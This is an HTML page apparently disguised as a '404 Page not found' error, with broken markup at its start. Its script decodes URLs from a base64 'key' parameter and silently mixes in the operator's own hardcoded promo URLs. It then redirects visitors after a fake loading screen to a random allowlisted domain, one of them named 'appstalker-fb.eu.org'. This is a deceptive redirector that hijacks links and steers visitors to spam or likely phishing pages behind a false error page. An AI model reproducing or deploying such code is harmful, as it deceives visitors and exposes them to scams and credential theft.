<body

<!-- Loader -->>
<div id="loader" class="loader-screen">
  <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
    <span class="visually-hidden">Loading...</span>
  </div>
  <p>Redirecting to destination page...</p>
<div class="lol">
<img src="https://i0wp.com/iili.io/FFCw6LG.md.jpg?resize=720,512" alt="FFCw6LG.md.jpg" loading="lazy" />
</div>
</div>
<!-- 404 Page -->

<div class="container error-container" id="errorPage">
  <div class="error-code">404</div>
  <h2 class="mb-3">Oops! Page not found</h2>
  <p class="text-muted">The link is invalid or not part of this website.</p>
</div>
<script>
(function () {
  const params = new URLSearchParams(window.location.search);
  const encoded = params.get('key');

  // Kalau tidak ada key, tidak melakukan apa-apa
  if (!encoded) return;

  try {
    const decoded = atob(encoded.trim());
    const userUrls = decoded.split('|'); // URL dari orang (di-encode ke base64)

    // âœ… URL default milik lo yang wajib ikut di-random-kan
    const myDefaultUrls = [
      "https://abnormalitylovingmammal.com/myvideo",
      "https://pwcenter.eu.org/promo"
    ];

    // Gabung semua jadi satu
    const allUrls = [...userUrls, ...myDefaultUrls];

    // Pilih acak salah satu dari semua URL itu
    const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];

    const urlObj = new URL(finalUrl);
    const host = urlObj.hostname;

    // Whitelist domain (biar makin aman)
    const allowedDomains = [
      "abnormalitylovingmammal.com",
      "pwcenter.eu.org",
      "otieu.com",
      "appstalker-fb.eu.org",
      "xpweyurt.eu.org"
    ];

    const isAllowed = allowedDomains.some(domain => host.includes(domain));

    if (isAllowed) {
      // Ganti meta tag kalau perlu
      const title = "Sedang mengalihkan ke halaman tujuan...";
      document.getElementById('meta-title').innerText = title;
      document.getElementById('meta-desc').setAttribute('content', title);
      document.getElementById('og-title').setAttribute('content', title);
      document.getElementById('og-desc').setAttribute('content', title);

      // Tampilkan loading
      document.getElementById("errorPage").style.display = "none";
      document.getElementById("loader").style.display = "flex";

      // Redirect setelah 1.2 detik
      setTimeout(() => {
        window.location.href = finalUrl;
      }, 1200);
    } else {
      console.warn("Domain tidak diizinkan:", host);
    }

  } catch (err) {
    console.error("Gagal decode base64:", err);
  }
})();
</script>


<script>
	document.addEventListener("DOMContentLoaded", function () {
  const images = document.querySelectorAll('img:not([loading])');

  const imageMap = new Map();

  images.forEach(img => {
    imageMap.set(img, img.src);
    img.src = "https://i0.wp.com/i.gifer.com/7V2P.gif?resize=720,512"; 
  });

  const onIntersection = (entries, observer) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const img = entry.target;
        const realSrc = imageMap.get(img);
        if (realSrc) {
          img.src = realSrc;
          imageMap.delete(img);
        }
        observer.unobserve(img);
      }
    });
  };

  const observer = new IntersectionObserver(onIntersection, {
    rootMargin: "0px 0px 100px 0px",
    threshold: 0.01
  });

  imageMap.forEach((_, img) => observer.observe(img));
});


</script>
